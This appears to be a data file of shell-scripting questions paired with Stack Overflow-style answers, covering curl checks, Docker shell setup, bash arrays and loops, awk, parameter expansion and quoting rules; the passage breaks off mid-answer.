    "How do I determine if a web page exists with shell scripting?": "Under a *NIX, you can use curl to issue a simple HEAD request (HEAD only asks for the headers, not the page body):\ncurl --head http://myurl/\nThen you can take only the first line, which contains the HTTP status code (200 OK, 404 Not Found, etc.):\ncurl -s --head http://myurl/ | head -n 1\nAnd then check if you got a decent response (status code is 200 or 3**):\ncurl -s --head http://myurl/ | head -n 1 | grep \"HTTP/1.[01] [23]..\"\nThis will output the first line if the status code is okay, or nothing if it isn't. You can also pipe that to /dev/null to get no output, and use $? to determine if it worked or no:\ncurl -s --head http://myurl/ | head -n 1 | grep \"HTTP/1.[01] [23]..\" > /dev/null\n# on success (page exists), $? will be 0; on failure (page does not exist or\n# is unreachable), $? will be 1\nEDIT -s simply tells curl to not show a \"progress bar\".",
    "Docker Bash prompt does not display color output": "The OP SolomonT reports that docker run with env do work:\ndocker run --rm -it -e \"TERM=xterm-256color\" govim bash -l\nAnd Fernando Correia adds in the comments:\nTo get both color support and make tmux work, I combined both examples:\ndocker exec -it my-container env TERM=xterm-256color script -q -c \"/bin/bash\" /dev/null\nAs chepner commented (earlier answer), .bash_profile is sourced (itis an interactive shell), since bash_prompt is called by .bash_profile.\nBut docker issue 9299 illustrates that TERM doesn't seem to be set right away, forcing the users to open another bash with:\ndocker exec -ti test env TERM=xterm-256color bash -l\nYou have similar color issues with issue 8755.\nTo illustrate/reproduce the problem:\ndocker exec -ti $CONTAINER_NAME tty\nnot a tty\nThe current workaround is :\ndocker exec -ti `your_container_id` script -q -c \"/bin/bash\" /dev/null\nBoth are supposing you have a running container first, which might not be convenient here.",
    "Show full path when using options": "What about this trick...\nls -lrt -d -1 $PWD/{*,.*}\n\nOR\n\nls -lrt -d -1 $PWD/*\nI think this has problems with empty directories but if another poster has a tweak I'll update my answer. Also, you may already know this but this is probably be a good candidate for an alias given it's lengthiness.\n[update] added some tweaks based on comments, thanks guys.\n[update] as pointed out by the comments you may need to tweek the matcher expressions depending on the shell (bash vs zsh). I've re-added my older command for reference.",
    "Read JSON data in a shell script [duplicate]": "There is jq for parsing json on the command line:\n jq '.Body'\nVisit this for jq: https://stedolan.github.io/jq/",
    "How to read output of sed into a variable": "You can use command substitution as:\nnew_filename=$(echo \"$a\" | sed 's/.txt/.log/')\nor the less recommended backtick way:\nnew_filename=`echo \"$a\" | sed 's/.txt/.log/'`",
    "How to get exit status of a shell command used in GNU Makefile?": "In the makefile-:\nmycommand || (echo \"mycommand failed $$?\"; exit 1)\nEach line in the makefile action invokes a new shell - the error must be checked in the action line where the command failed.\nIf mycommand fails the logic branches to the echo statement then exits.",
    "How can I make TMUX be active whenever I start a new shell session?": "warning this can now 'corrupt' (make it unable to open a terminal window - which is not good!) your Ubuntu logins. Use with extreme caution and make sure you have a second admin account on the computer that you can log into in case you have the same problems I did. See my other answer for more details and a different approach.\nGiven that warning, the simplest solution can be to append the tmux invocation to the end of your .bashrc, e.g.\nalias g=\"grep\"\nalias ls=\"ls --color=auto\"\n\n# ...other stuff...\n\nif [[ ! $TERM =~ screen ]]; then\n    exec tmux\nfi\nNote that the exec means that the bash process which starts when you open the terminal is replaced by tmux, so Ctrl-B D (i.e. disconnect from tmux) actually closes the window, instead of returning to the original bash process, which is probably the behaviour you want?\nAlso, the if statement is required (it detects if the current bash window is in a tmux process already) otherwise each time you start tmux, the contained bash process will attempt to start its own tmux session, leading to an infinite number of nested tmuxen which can be, err, quite annoying (that said, it looks cool).\nHowever, there is a very small risk this can make bash behave in a way that other programs don't expect, since running bash can possibly cause it to turn into a tmux process, so it might be better to modify how you start your terminal emulator.\nI use a small executable shell script ~/bin/terminal (with ~/bin in $PATH, so it is found automatically) that looks a bit like:\n#!/bin/sh\nexec gnome-terminal -e tmux\n(I don't use gnome-terminal, so you might have to remove the exec, I'm not sure.)\nNow whenever you run the terminal scipt you have a terminal with tmux. You can add this to your menu/desktop/keyboard shortcuts to replace the default terminal.\n(This approach also allows you to more easily customise other things about the terminal emulator later, if you ever desire.)",
    "What is the *nix command to view a user's default login shell": "The canonical way to query the /etc/passwd file for this information is with getent. You can parse getent output with standard tools such as cut to extract the user's login shell. For example:\n$ getent passwd $LOGNAME | cut -d: -f7\n/bin/bash",
    "Iterate over lines instead of words in a for loop of shell script": "The for loop is not designed to loop over lines. Instead it loops over words. Words are things separated by space. Lines are things separated by newline. More on that later.\nThe idiomatic way to loop over lines is to use a while loop in combination with read:\nioscan -m dsf | while read -r line\ndo\n  printf '%s\\n' \"$line\"\ndone\nAlternatively:\nwhile read -r line\ndo\n  printf '%s\\n' \"$line\"\ndone < <(ioscan -m dsf)\nBoth work fine for most simple cases. The second variant is using a process substitution which might not be available in all shells.\nBoth variants have advantages and disadvantages which mainly become apparent if you want to manipulate variables inside the loop.\nFor more information see http://mywiki.wooledge.org/BashFAQ/024\ntechnical nitpick:\nwords, or fields as they are called in bash, are things separated by space but also by tab and newlines. basically things separated by whitespace.\nthe separator separating the fields is defined in the IFS variable (short for Internal Field Separator). Usually $IFS contains a space, a tab, and a newline.\nOften you will see the suggestion to loop over lines by changing the value of $IFS to only newline.\n# not recommended\nOLDIFS=\"$IFS\"\nIFS=$'\\n'\nfor line in $(ioscan -m dsf)\ndo\n  printf '%s\\n' \"$line\"\ndone\nIFS=\"$OLDIFS\"\n(the $'\\n' is is called ANSI-C Quoting and might not be available in all shells)\nI do not recommend changing $IFS. Many commands rely on sane setting for $IFS. Changing $IFS will often cause an endless nightmare of obscure bug hunting.\nSee also:\nhttp://wiki.bash-hackers.org/syntax/ccmd/classic_for\nhttp://wiki.bash-hackers.org/commands/builtin/read\nhttp://mywiki.wooledge.org/IFS\nhttp://mywiki.wooledge.org/SubShell\nhttp://mywiki.wooledge.org/ProcessSubstitution",
    "What is the meaning of `! -d` in this Bash command?": "-d is a operator to test if the given directory exists or not.\nFor example, I am having a only directory called /home/sureshkumar/test/.\nThe directory variable contains the \"/home/sureshkumar/test/\"\nif [ -d $directory ]\nThis condition is true only when the directory exists. In our example, the directory exists so this condition is true.\nI am changing the directory variable to \"/home/a/b/\". This directory does not exist.\nif [ -d $directory ]\nNow this condition is false. If I put the ! in front if the directory does not exist, then the if condition is true. If the directory does exists then the if [ ! -d $directory ] condition is false.\nThe operation of the ! operator is if the condition is true, then it says the condition is false. If the condition is false then it says the condition is true. This is the work of ! operator.\nif [ ! -d $directory ]\nThis condition true only if the $directory does not exist. If the directory exists, it returns false.",
    "Shell Script: correct way to declare an empty array": "In BASH 4+ you can use the following for declaring an empty Array:\ndeclare -a ARRAY_NAME=()\nYou can then append new items NEW_ITEM1 & NEW_ITEM2 by:\nARRAY_NAME+=(NEW_ITEM1)\nARRAY_NAME+=(NEW_ITEM2)\nPlease note that parentheses () is required while adding the new items. This is required so that new items are appended as an Array element. If you did miss the (), NEW_ITEM2 will become a String append to first Array Element ARRAY_NAME[0].\nAbove example will result into:\necho ${ARRAY_NAME[@]}\nNEW_ITEM1 NEW_ITEM2\n\necho ${ARRAY_NAME[0]}\nNEW_ITEM1\n\necho ${ARRAY_NAME[1]}\nNEW_ITEM2\nNext, if you performed (note the missing parenthesis):\nARRAY_NAME+=NEW_ITEM3\nThis will result into:\necho ${ARRAY_NAME[@]}\nNEW_ITEM1NEW_ITEM3 NEW_ITEM2\n\necho ${ARRAY_NAME[0]}\nNEW_ITEM1NEW_ITEM3\n\necho ${ARRAY_NAME[1]}\nNEW_ITEM2\nThanks to @LenW for correcting me on append operation.",
    "Differences between declare, typeset and local variable in Bash": "Difference between typeset and declare:\nThe former is more portable(e.g. ksh), while the latter is more preferable when portability is not a concern.\nDifference between declare(or typeset) and local when used inside a function:\nThe former implies the latter, but more powerful. For example, declare -i x makes x have the integer attribute, declare -r x makes x readonly, etc.",
    "Create a dedicated folder for every zip files in a directory and extract zip files": "unzip file.zip -d xxx will extract files to directory xxx, and xxx will be created if it is not there. You can check the man page for details.\nThe awk line below should do the job:\nls *.zip|awk -F'.zip' '{print \"unzip \"$0\" -d \"$1}'|sh\nSee the test below,\nnote that I removed |sh at the end, since my zips are fake archives; I just want to show the generated command line here.\nkent$  ls -l\ntotal 0\n-rw-r--r-- 1 kent kent 0 Nov 12 23:10 001.zip\n-rw-r--r-- 1 kent kent 0 Nov 12 23:10 002.zip\n-rw-r--r-- 1 kent kent 0 Nov 12 23:10 003.zip\n-rw-r--r-- 1 kent kent 0 Nov 12 23:10 004.zip\n-rw-r--r-- 1 kent kent 0 Nov 12 23:10 005.zip\n-rw-r--r-- 1 kent kent 0 Nov 12 23:10 006.zip\n-rw-r--r-- 1 kent kent 0 Nov 12 23:10 007.zip\n\nkent$  ls *.zip|awk -F'.zip' '{print \"unzip \"$0\" -d \"$1}'\nunzip 001.zip -d 001\nunzip 002.zip -d 002\nunzip 003.zip -d 003\nunzip 004.zip -d 004\nunzip 005.zip -d 005\nunzip 006.zip -d 006\nunzip 007.zip -d 007",
    "How to split a list by comma not space": "Using a subshell substitution to parse the words undoes all the work you are doing to put spaces together.\nTry instead:\ncat CSV_file | sed -n 1'p' | tr ',' '\\n' | while read word; do\n    echo $word\ndone\nThat also increases parallelism. Using a subshell as in your question forces the entire subshell process to finish before you can start iterating over the answers. Piping to a subshell (as in my answer) lets them work in parallel. This matters only if you have many lines in the file, of course.",
    "Replace whitespace with a comma in a text file in Linux": "tr ' ' ',' <input >output \nSubstitutes each space with a comma, if you need you can make a pass with the -s flag (squeeze repeats), that replaces each input sequence of a repeated character that is listed in SET1 (the blank space) with a single occurrence of that character.\nUse of squeeze repeats used to after substitute tabs:\ntr -s '\\t' <input | tr '\\t' ',' >output ",
    "How to set font color for STDOUT and STDERR": "Create a function in a bash shell or script:\ncolor()(set -o pipefail;\"$@\" 2>&1>&3|sed $'s,.*,\\e[31m&\\e[m,'>&2)3>&1\nUse it like this:\n$ color command -program -args\nIt will show the command's stderr in red.\nKeep reading for an explanation of how it works. There are some interesting features demonstrated by this command.\ncolor()... \u2014 Creates a bash function called color.\nset -o pipefail \u2014 This is a shell option that preserves the error return code of a command whose output is piped into another command. This is done in a subshell, which is created by the parentheses, so as not to change the pipefail option in the outer shell.\n\"$@\" \u2014 Executes the arguments to the function as a new command. \"$@\" is equivalent to \"$1\" \"$2\" ...\n2>&1 \u2014 Redirects the stderr of the command to stdout so that it becomes sed's stdin.\n>&3 \u2014 Shorthand for 1>&3, this redirects stdout to a new temporary file descriptor 3. 3 gets routed back into stdout later.\nsed ... \u2014 Because of the redirects above, sed's stdin is the stderr of the executed command. Its function is to surround each line with color codes.\n$'...' A bash construct that causes it to understand backslash-escaped characters\n.* \u2014 Matches the entire line.\n\\e[31m \u2014 The ANSI escape sequence that causes the following characters to be red\n& \u2014 The sed replace character that expands to the entire matched string (the entire line in this case).\n\\e[m \u2014 The ANSI escape sequence that resets the color.\n>&2 \u2014 Shorthand for 1>&2, this redirects sed's stdout to stderr.\n3>&1 \u2014 Redirects the temporary file descriptor 3 back into stdout.",
    "Is it possible to run JavaScript files from the command line?": "Expanding upon the solution to use Node.js\u2026\nHere are some examples and screenshots from a page on Command Line JavaScript.\nThe Node REPL (Shell)\nIf you enter node on the command line with no arguments, you'll be in the Read-Eval-Print-Loop, or REPL for short, otherwise known as a shell. Here you can interactively enter JavaScript expressions and have them immediately evaluated.\nEvaluate a JavaScript file from the command line\nCreate a file with the following content:\nconsole.log('Hello, world');\nFrom the command line, use node to evaluate the file:",
    "Unix time and leap seconds": "The number of seconds per day are fixed with Unix timestamps.\nThe Unix time number is zero at the Unix epoch, and increases by exactly 86400 per day since the epoch.\nSo it cannot represent leap seconds. The OS will slow down the clock to accommodate for this. The leap seconds is simply not existent as far a Unix timestamps are concerned.",
    "How to match a pattern given in a variable in awk?": "If you want to provide the pattern through a variable, you need to use ~ to match against it:\nawk -v pat=\"$pattern\" '$0 ~ pat'\nIn your case, the problem does not have to do with -F.\nThe problem is the usage of /pat/ when you want pat to be a variable. If you say /pat/, awk understands it as a literal \"pat\", so it will try to match those lines containing the string \"pat\".\nAll together, your code should be:\nawk -v pat=\"$pattern\" -F \":\" '$0~pat{print $1, $2, $3, $4 }' file\n#                             ^^^^^^\nSee an example:\nGiven this file:\n$ cat file\nhello\nthis is a var\nhello bye\nLet's look for lines containing \"hello\":\n$ awk '/hello/' file\nhello\nhello bye\nLet's now try looking for \"pat\", contained in a variable, the way you were doing it:\n$ awk -v pat=\"hello\" '/pat/' file\n$                                    # NO MATCHES!\nLet's now use the $0 ~ pat expression:\n$ awk -v pat=\"hello\" '$0~pat' file\nhello                                 # WE MATCH!\nhello bye\nOf course, you can use such expressions to match just one field and say awk -v pat=\"$pattern\" '$2 ~ pat' file and so on.\nFrom GNU Awk User's Guide \u2192 3.1 How to Use Regular Expressions:\nWhen a regexp is enclosed in slashes, such as /foo/, we call it a regexp constant, much like 5.27 is a numeric constant and \"foo\" is a string constant.\nAnd GNU Awk User's Guide \u2192 3.6 Using Dynamic Regexps:\nThe righthand side of a \u2018~\u2019 or \u2018!~\u2019 operator need not be a regexp constant (i.e., a string of characters between slashes). It may be any expression. The expression is evaluated and converted to a string if necessary; the contents of the string are then used as the regexp. A regexp computed in this way is called a dynamic regexp or a computed regexp:\nBEGIN { digits_regexp = \"[[:digit:]]+\" }\n$0 ~ digits_regexp    { print }\nThis sets digits_regexp to a regexp that describes one or more digits, and tests whether the input record matches this regexp.",
    "How to get PID of current rake task?": "You get the current PID in Ruby with Process.pid",
    "Get all aliases in Linux shell": "Are you wondering if you have a UNIX alias already set for a specific command?\nYou can find it easily by issuing this on the command line:\nalias\nThis command will list all aliases currently set for your shell session.",
    "What is the proper way to detect shell exit code when errexit option is set?": "How about this? If you want the actual exit code ...\n#!/bin/sh                                                                       \nset -e\n\ncat /tmp/doesnotexist && rc=$? || rc=$?                                         \necho exitcode: $rc        \n\ncat /dev/null && rc=$? || rc=$?                                                 \necho exitcode: $rc   \nOutput:\ncat: /tmp/doesnotexist: No such file or directory\nexitcode: 1\nexitcode: 0",
    "What is the Visual Studio shell (standalone shell) good for?": "I would like to mention that SQL Server Management Studio 2012 requires both of these entries in Add/Remove programs:\nMicrosoft Visual Studio 2010 Shell (Isolated) - ENU\nVisual Studio 2010 Prerequisites - English\nI know this because I uninstalled them, broke SSMS, and had to repair from the installation media, upon which those 2 items reappeared.",
    "How can I find my shell version using a Linux command?": "This will do it:\n$SHELL --version\nIn my case, the output is:\nzsh 5.0.2 (x86_64-pc-linux-gnu)",
    "Does bash have a way to un-export a variable without unsetting it?": "export -n FOO\nFrom help export:\nOptions:\n-f refer to shell functions\n-n remove the export property from each NAME\n-p display a list of all exported variables and functions",
    "Use sed to replace all backslashes with forward slashes": "sed can perform text transformations on input stream from a file or a pipeline. Example:\necho 'C:\\foo\\bar.xml' | sed 's/\\\\/\\//g'\noutputs:\nC:/foo/bar.xml",
    "pip install dotenv error code 1 Windows 10": "You should install python-dotenv\npip3 install python-dotenv\nor\npip install python-dotenv\ni.e\nC:\\Users\\USER>pip3 install python-dotenv\nCollecting python-dotenv\n  Downloading python_dotenv-0.8.2-py2.py3-none-any.whl\nInstalling collected packages: python-dotenv\nSuccessfully installed python-dotenv-0.8.2\nRefer this issue",
    "Using sudo with Python script": "Many answers focus on how to make your solution work, while very few suggest that your solution is a very bad approach. If you really want to \"practice to learn\", why not practice using good solutions? Hardcoding your password is learning the wrong approach!\nIf what you really want is a password-less mount for that volume, maybe sudo isn't needed at all! So may I suggest other approaches?\nUse /etc/fstab as mensi suggested. Use options user and noauto to let regular users mount that volume.\nUse Polkit for passwordless actions: Configure a .policy file for your script with <allow_any>yes</allow_any> and drop at /usr/share/polkit-1/actions\nEdit /etc/sudoers to allow your user to use sudo without typing your password. As @Anders suggested, you can restrict such usage to specific commands, thus avoiding unlimited passwordless root priviledges in your account. See this answer for more details on /etc/sudoers.\nAll the above allow passwordless root privilege, none require you to hardcode your password. Choose any approach and I can explain it in more detail.\nAs for why it is a very bad idea to hardcode passwords, here are a few good links for further reading:\nWhy You Shouldn\u2019t Hard Code Your Passwords When Programming\nHow to keep secrets secret (Alternatives to Hardcoding Passwords)\nWhat's more secure? Hard coding credentials or storing them in a database?\nUse of hard-coded credentials, a dangerous programming error: CWE\nHard-coded passwords remain a key security flaw",
    "Methods to detect public IP address in bash": "curl ipinfo.io/ip\nOr\nwget -q -O - ipinfo.io/ip\nOr\nlynx -source ipinfo.io/ip\nget public ip address\nYou can find other ip reporting websites instead of ipinfo.io as well. To name a few:\nhttp://ip4only.me/api/\nhttp://ip6only.me/api/\nhttps://ipgrab.io/ \u27a1 (got from incogma's answer)\nhttps://icanhazip.com/ \u27a1 (got from MCurbelo's answer)\nhttps://api.ipify.org/ \u27a1 (got from teuber789's answer)\nAlso, what is my ip shows more information about that ip.",
    "Pipe input into a script": "Commands inherit their standard input from the process that starts them. In your case, your script provides its standard input for each command that it runs. A simple example script:\n#!/bin/bash\ncat > foo.txt\nPiping data into your shell script causes cat to read that data, since cat inherits its standard input from your script.\n$ echo \"Hello world\" | myscript.sh\n$ cat foo.txt\nHello world\nThe read command is provided by the shell for reading text from standard input into a shell variable if you don't have another command to read or process your script's standard input.\n#!/bin/bash\n\nread foo\necho \"You entered '$foo'\"\n\n$ echo bob | myscript.sh\nYou entered 'bob'",
    "bash shell nested for loop": "The question does not contain a nested loop, just a single loop. But THIS nested version works, too:\n# for i in c d; do for j in a b; do echo $i $j; done; done\nc a\nc b\nd a\nd b",
    "How to check if multiple variables are defined or not in bash": "You can use -z to test whether a variable is unset or empty:\nif [[ -z $DB || -z $HOST || -z $DATE ]]; then\n  echo 'one or more variables are undefined'\n  exit 1\nfi\n\necho \"You are good to go\"\nAs you have used the\nbash\ntag, I've used an extended test [[, which means that I don't need to use quotes around my variables. I'm assuming that you need all three variables to be defined in order to continue. The exit in the if branch means that the else is superfluous.\nThe standard way to do it in any POSIX-compliant shell would be like this:\nif [ -z \"$DB\" ] || [ -z \"$HOST\" ] || [ -z \"$DATE\" ]; then\n  echo 'one or more variables are undefined'        \n  exit 1\nfi\nThe important differences here are that each variable check goes inside a separate test and that double quotes are used around each parameter expansion.",
    "Can I run 'su' in the middle of a bash script?": "You can, but bash won't run the subsequent commands as postgres. Instead, do:\nsu postgres -c 'dropdb $user'\nThe -c flag runs a command as the user (see man su).",
    "How can I see all of the bash history?": "cat ~/.bash_history\nwould also work, although I tend to just use\nvim ~/.bash_history \nand then use /to search",
    "Can you prevent a command from going into the bash shell command history? [closed]": "On newer Bash Versions you could simply add a space at the beginning of your command. :) If it doesn't work by default, add [ \\t]* to HISTIGNORE. (As mentioned in the comments. thx)",
    "Shell: don't fail git clone if folder already exists": "The most stable solution would be to simply let it fail and print the error message. If you think that's too ugly for your scenario, you may redirect it to /dev/null:\nfolder=\"foo\"\nif ! git clone \"${url}\" \"${folder}\" 2>/dev/null && [ -d \"${folder}\" ] ; then\n    echo \"Clone failed because the folder ${folder} exists\"\nfi\nOtherwise you can do something like this:\nif [ ! -d \"$FOLDER\" ] ; then\n    git clone \"$URL\" \"$FOLDER\"\nfi\nbut that would be vulnerable to race conditions.",
    "fish shell. How to check if a variable is set/empty?": "set -q var (note the missing \"$\" - this uses the variable name) can be used to check if a variable has been set.\nset -q var[1] can be used to check whether the first element of a variable has been assigned (i.e. whether it is non-empty as a list).\ntest -n \"$var\" [fn0] (or [ -n \"$var\" ]) can be used to check whether a variable expands to a non-empty string (and test -z is the inverse - true if it is empty).\nThese will be true/false in slightly different circumstances.\nWhen no set var has been performed at all (and it has not been inherited from the parent process), set -q var, set -q var[1] and test -n \"$var\" will be false, test -z \"$var\" will be true.\nWhen something like set var has been done (without any additional arguments), set -q var will be true, set -q var[1] will be false.\nWhen something like set var \"\" has been done, both set versions will be true.\nWhen something like set var \"somestring\" (or even set var \"\" \"\" [fn1]) has been done, the sets will be true and test -z \"$var\" will be false.\n[fn0]: You never want to use test (or [) without quoting the variable. One particularly egregious example is that test -n $var will return true both if the variable contains something and if it is list-empty/unset (no set at all or set var without arguments). This is because fish's test is one of the few parts that follow POSIX, and that demands that test with any one argument be true. Also it does not handle lists properly - test -n $var will have weird results if var has more than one element.\n[fn1]: This is because a list will be expanded as a string by joining the elements with spaces, so the list consisting of two empty strings will expand to \" \" - one space. Since that isn't empty, test -z returns false.",
    "How to diff directories over ssh": "If you needn't diff the detail in file, just get the difference of dir/file name, then try this:\n(Note: need set \"SSH login without password\", for detail, review this URL: http://www.linuxproblem.org/art_9.html)\ndiff <(ssh admin@10.0.0.10 ls -R /home/admin) <(ls -R /home/admin)",
    "Grab the filename in Unix out of full path": "In bash:\npath=/this/is/could/be/any/path/abc.txt\nIf your path has spaces in it, wrap it in \"\npath=\"/this/is/could/be/any/path/a b c.txt\"\nThen to extract the path, use the basename function\nfile=$(basename \"$path\")\nor\nfile=${path##*/}",
    "Expression after last specific character": "It is one of several shell features, generically called shell expansion. This particular expansion is called parameter expansion*.\nYou can think of this particular shell expansion form as a left-truncate string function. You must use the curly braces as shown (that is not optional)..\nWhen you use only one #, it means left-truncate only the first occurrence of the pattern which follows (up to the closing }. When you use two ##, it means left-truncate all consecutive pattern-matches. The result of var=\"a/b/c\"; echo ${var#*/} is b/c... echo ${var##*/} returns c.\nThere is a complementary right-truncate. It uses % instead of the #... (I \"remember\" which is which because # is like a bash comment; always on the left).\nThe * is treated as a bash wildcard expansion.\nHere is a list of all shell expansions, presented in precedence order.\nThe order of expansions is:\n1. brace expansion ... prefix{-,\\,}postfix             # prefix-postfix prefix,postfix\n                    .. {oct,hex,dec,bin}               # oct hex dec bin\n                     . {a..b}{1..2}                    # a1 a2 b1 b2\n                     . {1..04}                         # 01 02 03 04\n                     . {01..4}                         # 01 02 03 04\n                     . {1..9..2}                       # 1 3 5 7 9\n                     . \\$\\'\\\\x{0..7}{{0..9},{A..F}}\\'  # $'\\x00' .. $'\\x7F'     \n\n2. tilde expansion .... ~           # $HOME\n                    ... ~axiom      # $(dirname \"$HOME\")/axiom  \n                    ... ~fred       # $(dirname \"$HOME\")/fred\n                     .. ~+          # $PWD     (current working directory)\n                     .. ~-          # $OLDPWD  (previous working directory. If OLDPWD is unset,\n                                                        ~- is not expanded. ie. It stays as-is,\n                                                          regardless of the state of nullglob.)\n                                    # Expansion for Directories in Stack. ie. \n                                    # The list printed by 'dirs' when invoked without options \n                      . ~+N         #    Nth directory in 'dirs' list (from LHS)\n                      . ~-N         #    Nth directory in 'dirs' list (from RHS)\n\n3. parameter expansion .... ${VAR/b/-dd-}  \n                        ... ${TEST_MODE:-0}\n                         .. ${str: -3:2}  # note space after :\n                          . ${#string}\n\n4. (processed left-to-right) \n     variable expansion \n     arithmetic expansion\n     command substitution\n\n\u25b65. word splitting          # based on $IFS (Internal Field Seperator)\n\n\u25b76. pathname expansion\n      according to options such as:   \n      nullglob, GLOBIGNORE, ...and more\n\n# Note: ===============\n\u25b6 5. word splitting     \u21b0 \n\u25b7 6. pathname expansion \u21b0  \n# =====================  \u21b3  are not performed on words between  [[  and  ]]",
    "Why `~/.bashrc` is not executed when run docker container?": "None of the existing answers accurately answer the title question: Why ~/.bashrc is not executed when run docker container?\nThere are two things to be aware of:\nUse login shell\nAccording to the bash man page:\nWhen bash is invoked as an interactive login shell, or as a non-interactive shell with the --login option, it first reads and executes commands from the file /etc/profile, if that file exists. After reading that file, it looks for ~/.bash_profile, ~/.bash_login, and ~/.profile, in that order, and reads and executes commands from the first one that exists and is readable. The --noprofile option may be used when the shell is started to inhibit this behavior.\nTherefore, in order to have .profile/.bashrc read automatically upon invocation of bash, it is necessary to invoke bash with the --login or -l option.\nYou can do this in a couple ways:\n1. Set the shell to include -l option. For example,\nSHELL [\"/bin/bash\", \"-l\", \"-c\"]\n2. Invoke -l for specific commands using the exec form of RUN:\nCMD [\"/bin/bash\", \"-l\", \"-c\", \"/workspace/launch.sh\"]\nNote top of .bashrc\nFrom the man page above, we know the order in which profile files are searched and loaded. If you look at /root/.profile you may see something like this:\n# ~/.profile: executed by Bourne-compatible login shells.\n\nif [ \"$BASH\" ]; then\n  if [ -f ~/.bashrc ]; then\n    . ~/.bashrc\n  fi\nfi\n\nmesg n 2> /dev/null || true\nThis is how ~/.bashrc gets source for a bash shell. Therefore, we can expect ~/.bashrc to be sourced when the bash shell is used.\nHowever, look carefully near the top of your .bashrc file:\n# If not running interactively, don't do anything\n[ -z \"$PS1\" ] && return\nThis means that effectively the remaining contents of .bashrc are ignored except for interactive shells.\nOne answer suggests using the -i option of bash to invoke an interactive shell. This does work because the environment variable PS1 is set for interactive shells, and therefore .bashrc continues.\nHowever, perhaps you don't want an interactive shell. In this case, there are a few options:\n1. Comment out the return line. You can use something like this in your Dockerfile:\nRUN sed -e '/[ -z \"$PS1\" ] && return/s/^/#/g' -i /root/.bashrc\nThis modification to .bashrc will prevent its early exit from non-interactive invocations.\n2. Move the nvm setup to .profile. Move the last three lines of your .bashrc file to .profile so they're executed unconditionally.\n3. Manually source .bashrc. As other answers have already noted, you can certainly manually source .bashrc as needed, as in,\nRUN source /root/.bashrc && /workspace/launch.sh\nObserve that much of the content of .bashrc makes the most sense for interactive shells and is usually unnecessary otherwise, which may make option 2 above the most appealing.",
    "Remove all special characters and case from string in bash": "cat yourfile.txt | tr -dc '[:alnum:]\\n\\r' | tr '[:upper:]' '[:lower:]'\nThe first tr deletes special characters. d means delete, c means complement (invert the character set). So, -dc means delete all characters except those specified. The \\n and \\r are included to preserve linux or windows style newlines, which I assume you want.\nThe second one translates uppercase characters to lowercase.",
    "Get total size of a list of files in UNIX": "You should simply be able to pass $file_list to du:\ndu -ch $file_list | tail -1 | cut -f 1\ndu options:\n-c display a total\n-h human readable (i.e. 17M)\ndu will print an entry for each file, followed by the total (with -c), so we use tail -1 to trim to only the last line and cut -f 1 to trim that line to only the first column.",
    "Passing arguments by reference": "It's 2018, and this question deserves an update. At least in Bash, as of Bash 4.3-alpha, you can use namerefs to pass function arguments by reference:\nfunction boo() \n{\n    local -n ref=$1\n    ref='new' \n}\n\nSOME_VAR='old'\necho $SOME_VAR # -> old\nboo SOME_VAR\necho $SOME_VAR # -> new\nThe critical pieces here are:\nPassing the variable's name to boo, not its value: boo SOME_VAR, not boo $SOME_VAR.\nInside the function, using local -n ref=$1 to declare a nameref to the variable named by $1, meaning it's not a reference to $1 itself, but rather to a variable whose name $1 holds, i.e. SOME_VAR in our case. The value on the right-hand side should just be a string naming an existing variable: it doesn't matter how you get the string, so things like local -n ref=\"my_var\" or local -n ref=$(get_var_name) would work too. declare can also replace local in contexts that allow/require that. See chapter on Shell Parameters in Bash Reference Manual for more information.\nThe advantage of this approach is (arguably) better readability and, most importantly, avoiding eval, whose security pitfalls are many and well-documented.",
    "How can I pass a file argument to my bash script using a Terminal command in Linux? [duplicate]": "It'll be easier (and more \"proper\", see below) if you just run your script as\nmyprogram /path/to/file\nThen you can access the path within the script as $1 (for argument #1, similarly $2 is argument #2, etc.)\nfile=\"$1\"\nexternalprogram \"$file\" [other parameters]\nOr just\nexternalprogram \"$1\" [otherparameters]\nIf you want to extract the path from something like --file=/path/to/file, that's usually done with the getopts shell function. But that's more complicated than just referencing $1, and besides, switches like --file= are intended to be optional. I'm guessing your script requires a file name to be provided, so it doesn't make sense to pass it in an option.",
    "Use bash to find first folder name that contains a string": "You can use the -quit option of find:\nfind <dir> -maxdepth 1 -type d -name '*foo*' -print -quit",
    "Exporting JSON to environment variables": "Borrowing from this answer which does all of the hard work of turning the JSON into key=value pairs, you could get these into the environment by looping over the jq output and exporting them:\nfor s in $(echo $values | jq -r \"to_entries|map(\\\"\\(.key)=\\(.value|tostring)\\\")|.[]\" ); do\n    export $s\ndone\nIf the variables being loaded contain embedded whitespace, this is also reasonable, if slightly more complex:\nwhile read -rd $'' line\ndo\n    export \"$line\"\ndone < <(jq -r <<<\"$values\" \\\n         'to_entries|map(\"\\(.key)=\\(.value)\\u0000\")[]')",
    "Should I use quotes in environment path names?": "Tip of the hat to @gniourf_gniourf and @chepner for their help.\ntl;dr\nTo be safe, double-quote: it'll work in all cases, across all POSIX-like shells.\nIf you want to add a ~-based path, selectively leave the ~/ unquoted to ensure that ~ is expanded; e.g.: export PATH=~/\"bin:$PATH\". See below for the rules of ~ expansion in variable assignments.\nAlternatively, simply use $HOME inside a single, double-quoted string:\nexport PATH=\"$HOME/bin:$PATH\"\nNOTE: The following applies to bash, ksh, and zsh, but NOT to (mostly) strictly POSIX compliant shells such as dash; thus, when you target /bin/sh, you MUST double-quote the RHS of export.[1]\nDouble-quotes are optional, ONLY IF the literal part of your RHS (the value to assign) contains neither whitespace nor other shell metacharacters.\nWhether the values of the variables referenced contain whitespace/metacharacters or not does not matter - see below.\nAgain: It does matter with sh, when export is used, so always double-quote there.\nThe reason you can get away without double-quoting in this case is that variable-assignment statements in POSIX-like shells interpret their RHS differently than arguments passed to commands, as described in section 2.9.1 of the POSIX spec:\nSpecifically, even though initial word-splitting is performed, it is only applied to the unexpanded (raw) RHS (that's why you do need quoting with whitespace/metacharacters in literals), and not to its results.\nThis only applies to genuine assignment statements of the form\n<name>=<value> in all POSIX-like shells, i.e., if there is no command name before the variable name; note that that includes assignments prepended to a command to define ad-hoc environment variables for it, e.g., foo=$bar cmd ....\nAssignments in the context of other commands should always be double-quoted, to be safe:\nWith sh (in a (mostly) strictly POSIX-compliant shell such as dash) an assignment with export is treated as a regular command, and the foo=$bar part is treated as the 1st argument to the export builtin and therefore treated as usual (subject to word-splitting of the result, too).\n(POSIX doesn't specify any other commands involving (explicit) variable-assignment; declare, typeset, and local are nonstandard extensions).\nbash, ksh, zsh, in an understandable deviation from POSIX, extend the assignment logic to export foo=$bar and typeset/declare/local foo=$bar as well. In other words: in bash, ksh, zsh, export/typeset/declare/local commands are treated like assignments, so that quoting isn't strictly 